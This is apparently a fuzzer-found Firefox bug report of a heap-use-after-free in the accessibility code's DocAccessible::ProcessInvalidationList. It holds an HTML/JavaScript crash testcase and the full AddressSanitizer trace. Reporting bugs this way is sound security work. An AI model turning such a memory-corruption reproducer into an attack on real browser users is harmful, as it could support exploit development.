@@ -1,0 +1,182 @@
+heap-use-after-free in mozilla::a11y::DocAccessible::ProcessInvalidationList
+The testcases crash the latest ASAN build of Firefox (BuildID=20160718145619) a follows. Requires fuzzPriv extension to crash reliably.
+
+<script>
+function start() {
+o73=document.createElement('style');
+o165=document.createRange();
+o191=document.createElement('a');
+o73.appendChild(o191);
+o268=document.createElement('th');
+document.documentElement.style.display='grid';
+setTimeout(f1, 4);
+}
+function f1() {
+o539=document.head;
+document.documentElement.srcdoc='';
+document.documentElement.appendChild(o268);
+o635=o165.createContextualFragment('<legend id="id28">');
+o191.appendChild(o635);
+setTimeout(f2, 4);
+}
+function f2() {
+o539.appendChild(o73);
+o268.setAttribute('aria-owns','id28');
+o191.textContent="ABC";
+fuzzPriv.CC();fuzzPriv.GC();
+location.reload();
+}
+</script>
+<body onload="start()"></body>
+
+=================================================================
+==23093==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d00003c198 at pc 0x7fc5caa02581 bp 0x7ffe4d64df80 sp 0x7ffe4d64df78
+READ of size 8 at 0x60d00003c198 thread T0 (Web Content)
+#0 0x7fc5caa02580 in GetParentNode /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsINode.h:915:12
+#1 0x7fc5caa02580 in GetContainerAccessible /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/mozilla/a11y/DocAccessible.h:281
+#2 0x7fc5caa02580 in mozilla::a11y::DocAccessible::ProcessInvalidationList() /builds/slave/m-cen-l64-asan-000000000000000/build/src/accessible/generic/DocAccessible.cpp:1358
+#3 0x7fc5ca978b83 in mozilla::a11y::NotificationController::WillRefresh(mozilla::TimeStamp) /builds/slave/m-cen-l64-asan-000000000000000/build/src/accessible/base/NotificationController.cpp:385:3
+#4 0x7fc5c9829416 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nsRefreshDriver.cpp:1712:7
+#5 0x7fc5c98318b6 in DoTick /builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nsRefreshDriver.cpp:1398:5
+#6 0x7fc5c98318b6 in DoRefresh /builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nsRefreshDriver.cpp:2148
+#7 0x7fc5c98318b6 in nsRefreshDriver::FinishedWaitingForTransaction() /builds/slave/m-cen-l64-asan-000000000000000/build/src/layout/base/nsRefreshDriver.cpp:2000
+#8 0x7fc5c4d894c3 in mozilla::layers::ClientLayerManager::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/gfx/layers/client/ClientLayerManager.cpp:421:5
+#9 0x7fc5c8ad1ea7 in mozilla::dom::TabChild::DidComposite(unsigned long, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/ipc/TabChild.cpp:3054:3
+#10 0x7fc5c4e78aae in mozilla::layers::CompositorBridgeChild::RecvDidComposite(unsigned long const&, unsigned long const&, mozilla::TimeStamp const&, mozilla::TimeStamp const&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/gfx/layers/ipc/CompositorBridgeChild.cpp:484:7
+#11 0x7fc5c3fdb545 in mozilla::layers::PCompositorBridgeChild::OnMessageReceived(IPC::Message const&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/ipc/ipdl/PCompositorBridgeChild.cpp:1383:20
+#12 0x7fc5c37aa517 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/MessageChannel.cpp:1658:14
+#13 0x7fc5c37a7356 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/MessageChannel.cpp:1596:17
+#14 0x7fc5c3795127 in mozilla::ipc::MessageChannel::OnMaybeDequeueOne() /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/MessageChannel.cpp:1563:5
+#15 0x7fc5c37c4ac2 in applyImpl<mozilla::ipc::MessageChannel, bool (mozilla::ipc::MessageChannel::*)()> /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/nsThreadUtils.h:729:12
+#16 0x7fc5c37c4ac2 in apply<mozilla::ipc::MessageChannel, bool (mozilla::ipc::MessageChannel::*)()> /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/nsThreadUtils.h:735
+#17 0x7fc5c37c4ac2 in mozilla::detail::RunnableMethodImpl<bool (mozilla::ipc::MessageChannel::*)(), false, true>::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/nsThreadUtils.h:764
+#18 0x7fc5c37c40af in Run /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/mozilla/ipc/MessageChannel.h:476:22
+#19 0x7fc5c37c40af in mozilla::ipc::MessageChannel::DequeueTask::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/mozilla/ipc/MessageChannel.h:495
+#20 0x7fc5c29e38c6 in nsThread::ProcessNextEvent(bool, bool*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsThread.cpp:1068:7
+#21 0x7fc5c2a61cac in NS_ProcessNextEvent(nsIThread*, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/glue/nsThreadUtils.cpp:290:10
+#22 0x7fc5c37b187f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/glue/MessagePump.cpp:100:21
+#23 0x7fc5c3726088 in RunInternal /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:232:3
+#24 0x7fc5c3726088 in RunHandler /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:225
+#25 0x7fc5c3726088 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:205
+#26 0x7fc5c91a8f6f in nsBaseAppShell::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/src/widget/nsBaseAppShell.cpp:156:3
+#27 0x7fc5cb236fb7 in XRE_RunAppShell /builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsEmbedFunctions.cpp:829:12
+#28 0x7fc5c3726088 in RunInternal /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:232:3
+#29 0x7fc5c3726088 in RunHandler /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:225
+#30 0x7fc5c3726088 in MessageLoop::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/chromium/src/base/message_loop.cc:205
+#31 0x7fc5cb236653 in XRE_InitChildProcess /builds/slave/m-cen-l64-asan-000000000000000/build/src/toolkit/xre/nsEmbedFunctions.cpp:659:7
+#32 0x4e2c35 in content_process_main(int, char**) /builds/slave/m-cen-l64-asan-000000000000000/build/src/ipc/app/../contentproc/plugin-container.cpp:224:19
+#33 0x7fc5bf47782f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291
+#34 0x41e7e8 in _start (/home/nils/fuzzer3/firefox/plugin-container+0x41e7e8)
+
+0x60d00003c198 is located 40 byte inside of 136-byte region [0x60d00003c170,0x60d00003c1f8)
+freed by thread T0 (Web Content) here:
+#0 0x4b4f3b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3
+#1 0x7fc5c28c2614 in SnowWhiteKiller::~SnowWhiteKiller() /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/base/nsCycleCollector.cpp:2685:9
+#2 0x7fc5c28c2206 in nsCycleCollector::FreeSnowWhite(bool) /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/base/nsCycleCollector.cpp:2859:3
+#3 0x7fc5c28c88c5 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/base/nsCycleCollector.cpp:3841:3
+#4 0x7fc5c28c807c in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/base/nsCycleCollector.cpp:3666:9
+#5 0x7fc5c28cb386 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/base/nsCycleCollector.cpp:4160:3
+#6 0x7fc5c57bc429 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsJSEnvironment.cpp:1436:3
+#7 0x7fc5c534068d in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsDOMWindowUtils.cpp:1307:3
+#8 0x7fc5c2a09436 in NS_InvokeByIndex /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_x86_64_unix.cpp:180:23
+#9 0x7fc5c43c02f2 in Invoke /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2075:12
+#10 0x7fc5c43c02f2 in Call /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1394
+#11 0x7fc5c43c02f2 in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1361
+#12 0x7fc5c43c745c in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1128:12
+#13 0x7fc5cd429f1b in CallJSNative /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jscntxtinlines.h:232:15
+#14 0x7fc5cd429f1b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:441
+#15 0x7fc5cd410c33 in CallFromStack /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:504:12
+#16 0x7fc5cd410c33 in Interpret(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:2873
+#17 0x7fc5cd3f740e in js::RunScript(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:399:12
+#18 0x7fc5cd42a5c0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:471:15
+#19 0x7fc5cd3da741 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:517:10
+#20 0x7fc5ccf5b368 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jsapi.cpp:2793:12
+#21 0x7fc5c42f9d45 in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/xpconnect/src/ExportHelpers.cpp:353:18
+#22 0x7fc5cd429f1b in CallJSNative /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jscntxtinlines.h:232:15
+#23 0x7fc5cd429f1b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:441
+#24 0x7fc5cd410c33 in CallFromStack /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:504:12
+#25 0x7fc5cd410c33 in Interpret(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:2873
+#26 0x7fc5cd3f740e in js::RunScript(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:399:12
+#27 0x7fc5cd42a5c0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:471:15
+#28 0x7fc5cd3da741 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:517:10
+#29 0x7fc5ccf5d8b8 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jsapi.cpp:2852:12
+#30 0x7fc5c717588d in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8
+#31 0x7fc5c540a40f in Call<nsCOMPtr<nsISupports> > /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:70:12
+#32 0x7fc5c540a40f in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsGlobalWindow.cpp:12260
+#33 0x7fc5c53e8544 in nsGlobalWindow::RunTimeout(nsTimeout*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsGlobalWindow.cpp:12503:32
+#34 0x7fc5c5380fd1 in nsGlobalWindow::TimerCallback(nsITimer*, void*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsGlobalWindow.cpp:12749:3
+#35 0x7fc5c29ff777 in nsTimerImpl::Fire() /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsTimerImpl.cpp:524:7
+#36 0x7fc5c29d6abb in nsTimerEvent::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/TimerThread.cpp:286:3
+
+previously allocated by thread T0 (Web Content) here:
+#0 0x4b525b in __interceptor_malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3
+#1 0x4e2f2d in moz_xmalloc /builds/slave/m-cen-l64-asan-000000000000000/build/src/memory/mozalloc/mozalloc.cpp:83:17
+#2 0x7fc5c7bb4743 in operator new /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:193:12
+#3 0x7fc5c7bb4743 in NS_NewHTMLLegendElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/html/HTMLLegendElement.cpp:13
+#4 0x7fc5c7cf4b78 in CreateHTMLElement /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/html/nsHTMLContentSink.cpp:292:41
+#5 0x7fc5c7cf4b78 in NS_NewHTMLElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/html/nsHTMLContentSink.cpp:273
+#6 0x7fc5c57ff36c in NS_NewElement(mozilla::dom::Element**, already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsNameSpaceManager.cpp:147:12
+#7 0x7fc5c49a7c26 in nsHtml5TreeOperation::CreateElement(int, nsIAtom*, nsHtml5HtmlAttributes*, mozilla::dom::FromParser, nsNodeInfoManager*, nsHtml5DocumentBuilder*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/parser/html/nsHtml5TreeOperation.cpp:351:3
+#8 0x7fc5c498b728 in nsHtml5TreeBuilder::createElement(int, nsIAtom*, nsHtml5HtmlAttributes*, void*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/parser/html/nsHtml5TreeBuilderCppSupplement.h:95:7
+#9 0x7fc5c49925a3 in nsHtml5TreeBuilder::appendToCurrentNodeAndPushElementMayFoster(nsHtml5ElementName*, nsHtml5HtmlAttributes*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/parser/html/nsHtml5TreeBuilder.cpp:4023:11
+#10 0x7fc5c4956bb1 in nsHtml5TreeBuilder::startTag(nsHtml5ElementName*, nsHtml5HtmlAttributes*, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/src/parser/html/nsHtml5TreeBuilder.cpp:1357:15
+#11 0x7fc5c4947478 in nsHtml5Tokenizer::emitCurrentTagToken(bool, int) /builds/slave/m-cen-l64-asan-000000000000000/build/src/parser/html/nsHtml5Tokenizer.cpp:306:7
+#12 0x7fc5c497dcc2 in int nsHtml5Tokenizer::stateLoop<nsHtml5SilentPolicy>(int, char16_t, int, char16_t*, bool, int, int) /builds/slave/m-cen-l64-asan-000000000000000/build/src/parser/html/nsHtml5Tokenizer.cpp:830:50
+#13 0x7fc5c493c3a5 in nsHtml5Tokenizer::tokenizeBuffer(nsHtml5UTF16Buffer*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/parser/html/nsHtml5Tokenizer.cpp:405:11
+#14 0x7fc5c4943d15 in nsHtml5StringParser::Tokenize(nsAString_internal const&, nsIDocument*, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/src/parser/html/nsHtml5StringParser.cpp:116:21
+#15 0x7fc5c5307196 in nsContentUtils::ParseFragmentHTML(nsAString_internal const&, nsIContent*, nsIAtom*, int, bool, bool) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsContentUtils.cpp:4518:5
+#16 0x7fc5c5305aec in nsContentUtils::CreateContextualFragment(nsINode*, nsAString_internal const&, bool, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsContentUtils.cpp:4408:13
+#17 0x7fc5c583a249 in nsRange::CreateContextualFragment(nsAString_internal const&, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsRange.cpp:2845:10
+#18 0x7fc5c641687d in mozilla::dom::RangeBinding::createContextualFragment(JSContext*, JS::Handle<JSObject*>, nsRange*, JSJitMethodCallArgs const&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/RangeBinding.cpp:1124:62
+#19 0x7fc5c752dab7 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/bindings/BindingUtils.cpp:2771:13
+#20 0x7fc5cd429f1b in CallJSNative /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jscntxtinlines.h:232:15
+#21 0x7fc5cd429f1b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:441
+#22 0x7fc5cd410c33 in CallFromStack /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:504:12
+#23 0x7fc5cd410c33 in Interpret(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:2873
+#24 0x7fc5cd3f740e in js::RunScript(JSContext*, js::RunState&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:399:12
+#25 0x7fc5cd42a5c0 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:471:15
+#26 0x7fc5cd3da741 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/vm/Interpreter.cpp:517:10
+#27 0x7fc5ccf5d8b8 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/slave/m-cen-l64-asan-000000000000000/build/src/js/src/jsapi.cpp:2852:12
+#28 0x7fc5c717588d in mozilla::dom::Function::Call(JSContext*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:36:8
+#29 0x7fc5c540a40f in Call<nsCOMPtr<nsISupports> > /builds/slave/m-cen-l64-asan-000000000000000/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:70:12
+#30 0x7fc5c540a40f in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsGlobalWindow.cpp:12260
+#31 0x7fc5c53e8544 in nsGlobalWindow::RunTimeout(nsTimeout*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsGlobalWindow.cpp:12503:32
+#32 0x7fc5c5380fd1 in nsGlobalWindow::TimerCallback(nsITimer*, void*) /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsGlobalWindow.cpp:12749:3
+#33 0x7fc5c29ff777 in nsTimerImpl::Fire() /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/nsTimerImpl.cpp:524:7
+#34 0x7fc5c29d6abb in nsTimerEvent::Run() /builds/slave/m-cen-l64-asan-000000000000000/build/src/xpcom/threads/TimerThread.cpp:286:3
+
+SUMMARY: AddressSanitizer: heap-use-after-free /builds/slave/m-cen-l64-asan-000000000000000/build/src/dom/base/nsINode.h:915:12 in GetParentNode
+Shadow byte around the buggy address:
+0x0c1a7ffff7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+0x0c1a7ffff7f0: 00 fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00
+0x0c1a7ffff800: 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa
+0x0c1a7ffff810: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00
+0x0c1a7ffff820: 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fd fd
+=>0x0c1a7ffff830: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fa
+0x0c1a7ffff840: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
+0x0c1a7ffff850: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa
+0x0c1a7ffff860: fa fa fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+0x0c1a7ffff870: fd fd fd fa fa fa fa fa fa fa fa fa 00 00 00 00
+0x0c1a7ffff880: 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+Addressable: 00
+Partially addressable: 01 02 03 04 05 06 07
+Heap left redzone: fa
+Heap right redzone: fb
+Freed heap region: fd
+Stack left redzone: f1
+Stack mid redzone: f2
+Stack right redzone: f3
+Stack partial redzone: f4
+Stack after return: f5
+Stack use after scope: f8
+Global redzone: f9
+Global init order: f6
+Poisoned by user: f7
+Container overflow: fc
+Array cookie: ac
+Intra object redzone: bb
+ASan internal: fe
+Left alloca redzone: ca
+Right alloca redzone: cb
+==23093==ABORTING
